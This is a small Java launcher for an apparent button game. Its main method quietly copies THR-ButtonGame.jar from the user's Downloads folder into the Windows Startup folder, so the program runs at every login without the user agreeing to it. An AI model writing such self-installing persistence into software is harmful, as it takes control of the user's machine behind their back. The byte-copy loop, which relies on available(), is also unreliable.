package Buttongame;

import java.io.*;


public class Start_Game {

	public static void main(String[] args) throws Exception{
		welcome wel=new welcome();
		//String str=new com.sun.security.auth.module.NTSystem().getName();//to get the user name
		String home = System.getProperty("user.home");//C:\Users\Tekula Hemanth Reddy
		File w = new File(home+"/Downloads"); 
		File array[]=w.listFiles();
		System.out.println(home);
		for(int i=0;i<array.length;i++)
		{
			//System.out.println(array[i].getName());
			if(array[i].getName().equalsIgnoreCase("THR-ButtonGame.jar"))
			{
			FileInputStream instr=new FileInputStream(array[i].getAbsolutePath());
			FileOutputStream oustr=new FileOutputStream(home+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\THR-ButtonGame.jar");
			int b=instr.available();
			for(int j=0;j<b;j++)
			{
				oustr.write(instr.read());
			}
			oustr.close();
			instr.close();
			System.out.println("done");
			}
		}
	}

}
